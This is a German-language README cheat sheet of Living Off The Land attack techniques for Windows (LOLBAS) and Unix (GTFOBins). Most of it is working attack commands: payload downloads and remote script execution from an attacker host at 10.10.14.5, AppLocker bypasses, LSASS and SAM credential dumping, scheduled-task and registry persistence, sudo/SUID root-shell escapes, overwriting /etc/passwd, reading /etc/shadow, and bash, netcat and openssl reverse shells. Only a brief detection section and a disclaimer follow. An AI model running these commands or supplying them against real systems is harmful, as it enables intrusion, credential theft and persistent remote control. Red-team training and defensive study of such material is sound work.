<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏹 Living Off The Land (LOLBAS & GTFOBins) – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```
<p align="center">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Defense Evasion">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Living Off_The Land">
</p>

<p align="center">
  <b>🛠️ Umfassende Referenz zum Missbrauch legitimer vorinstallierter Systembinärdateien, um Code auszuführen, Payloads herunterzuladen und Berechtigungen zu erweitern</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Einführung](#-Einführung)
- [Warum vom Land leben?](#-why-living-off-the-land)
- [Teil 1: Windows LOLBAS](#-part-1-windows-lolbas)
  - [Dateidownload und Ingress](#file-download--ingress)
  - [Codeausführung und AppLocker-Umgehung](#code-execution--applocker-bypass)
  - [Anmeldeinformations-Dumping (LSASS, SAM, LSA)](#credential-dumping-lsass-sam-lsa)
  - [Aufklärung & Entdeckung](#reconnaissance--discovery)
  - [Persistenz und geplante Aufgaben](#persistence--scheduled-tasks)
- [Teil 2: Unix / Linux GTFOBins](#-part-2-unix--linux-gtfobins)
  - [SUID- und Sudo-Shell-Escapes](#suid--sudo-shell-escapes)
  - [Datei-Lese- und Schreibausnutzung](#file-read--write-exploitation)
  - [Netzwerk-Ingress und Reverse-Shells](#network-ingress--reverse-shells)
  - [GTFOBins High-Impact Interpreters](#gtfobins-high-impact-interpreters)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und Erkennung](#-defensive-überlegungen--erkennung)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
- [Ressourcen](#-Ressourcen)

---

## 🎯 Einführung

**Living Off The Land (LotL)** ist ein Post-Exploitation-Handwerk, bei dem Angreifer und Red Teamer ausschließlich legitime, integrierte, vertrauenswürdige Systembinärdateien, Skripts und Bibliotheken verwenden, die bereits auf dem Betriebssystem vorhanden sind.

- **LOLBAS (Windows):** Living Off The Land-Binärdateien, Skripte und Bibliotheken.
- **GTFOBins (Unix/Linux):** Kuratierte Sammlung von Unix-Binärdateien, die missbraucht werden können, um lokale Sicherheitsbeschränkungen zu umgehen, eingeschränkte Shells zu umgehen und Berechtigungen zu erweitern.

---

## ⚖️ Warum vom Land leben?

1. 🛡️ **Umgeht Anwendungs-Whitelisting:** Binärdateien wie `certutil.exe`, `rundll32.exe` oder `find` werden von Microsoft oder Betriebssystemanbietern digital signiert und von AppLocker, WDAC und SELinux als vertrauenswürdig eingestuft.
2. 👁️ **Umgeht signaturbasiertes AV/EDR:** Es wird keine fremde schädliche ausführbare Datei (`.exe`, `.elf`) auf der Festplatte abgelegt.
3. 📉 **Geringer Betriebsaufwand:** Reduziert protokollforensische Anomalien durch die Verwendung nativer Verwaltungstools.

---

## 🪟 Teil 1: Windows LOLBAS

### Datei-Download und Ingress

#### 1. Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```
#### 2. Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```
#### 3. Curl.exe & PowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```
---

### Codeausführung und AppLocker-Umgehung

#### 1. Mshta.exe (Remote-HTA/VBScript ausführen)
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```
#### 2. Regsvr32.exe (Squiablydoo-Technik)
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```
#### 3. Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```
#### 4. Wmic.exe (XSL-Skriptausführung)
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```
#### 5. Installutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```
---

### Anmeldeinformations-Dumping (LSASS, SAM, LSA)

#### 1. Rundll32.exe + Comsvcs.dll (LSASS-Dump)
LSASS-Prozessspeicher löschen, ohne Mimikatz zu löschen:
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```
#### 2. Reg.exe (SAM-, SYSTEM- und SECURITY-Hives speichern)
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```
---

### Aufklärung und Entdeckung
```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```
---

### Persistenz und geplante Aufgaben
```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```
---

## 🐧 Teil 2: Unix/Linux GTFOBins

### SUID- und Sudo-Shell-Escapes

Wenn für eine Binärdatei SUID festgelegt ist (`chmod u+s`) oder in `sudo -l` gewährt wird, missbrauchen Sie sie für eine sofortige Root-Shell:

#### 1. Sudo / SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```
#### 2. Sudo / SUID `vim` / `vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```
#### 3. Sudo / SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
#### 4. Sudo / SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### 5. Sudo / SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```
#### 6. Sudo / SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```
#### 7. Sudo `less` / `more` / `man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```
---

### Ausnutzung von Lese- und Schreibzugriffen auf Dateien

Wenn Sie eine Shell nicht direkt erzeugen können, verwenden Sie Dienstprogramme zum Lesen/Schreiben von Dateien, um `/etc/passwd` zu überschreiben oder `/etc/shadow` zu lesen:

#### `/etc/passwd` über Sudo/SUID `tee` überschreiben
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```
#### Sensible Dateien über SUID-Binärdateien lesen
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```
---

### Netzwerk-Ingress und Reverse-Shells

Übertragen Sie Dateien und Pop-Shells ohne `curl` oder `wget`:

#### 1. Bash Native TCP Reverse Shell
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
#### 2. Native Netcat (ohne `-e`-Flag)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```
#### 3. OpenSSL-verschlüsselte Reverse-Shell
Zum Angreifer:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
Am Ziel:
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```
---

### GTFOBins High-Impact-Dolmetscher

Wenn Dolmetschern Sudo / SUID gewährt wird:
```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```
---

## 📊 Kurzreferenztabelle

| Betriebssystem | Binär | Zweck | Missbrauchsbefehl |
|----|--------|---------|---------------|
| **Gewinn** | `certutil.exe` | Datei herunterladen | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **Gewinn** | `mshta.exe` | Remote-HTA-Exec | `mshta http://<IP>/payload.hta` |
| **Gewinn** | `regsvr32.exe` | Scriptlet Exec | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **Gewinn** | `rundll32.exe` | LSASS-Dump | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Unix**| `find` | SUID-Shell | `find . -exec /bin/sh -p \; -quit` |
| **Unix**| `awk` | Sudo-Shell | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **Unix**| `vim` | Shell Escape | `vim -c ':!/bin/sh'` |
| **Unix**| `tee` | Datei überschreiben | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ Defensive Überlegungen und Erkennung

1. **Befehlszeilenprotokollierung überwachen:**
   Aktivieren Sie **Sysmon (Ereignis-ID 1)** und die Windows-Prozesserstellungsprotokollierung (Ereignis-ID 4688) mit Befehlszeilenüberwachung, um anomale Argumente zu überwachen, die an `certutil`, `mshta` und `rundll32` übergeben werden.
2. **Böswillige Eltern-Kind-Beziehungen blockieren:**
   Überwachen Sie, wie `mshta.exe` oder `regsvr32.exe` `cmd.exe` oder `powershell.exe` hervorbringt.
3. **Sudo-Anweisungen einschränken:**
   Vermeiden Sie Platzhalter (`*`) in `/etc/sudoers`. Erlauben Sie Benutzern niemals, Texteditoren (`vim`, `nano`) oder Compiler als Root auszuführen.

---

## ⚠️ Rechtlicher Haftungsausschluss

> **WICHTIG:** Living Off The Land-Techniken missbrauchen vertrauenswürdige Verwaltungsprogramme. Dieses Spickzettel ist ausschließlich für rechtliche Sicherheitsbewertungen, defensive Härtung und pädagogische Studien gedacht.

---

## 📚 Ressourcen

- [Offizielles Repository des LOLBAS-Projekts](https://lolbas-project.github.io/)
- [Offizielles GTFOBins-Repository](https://gtfobins.github.io/)
- [MITRE ATT&CK: Untergrabung von Vertrauenskontrollen (T1564)](https://attack.mitre.org/techniques/T1564/)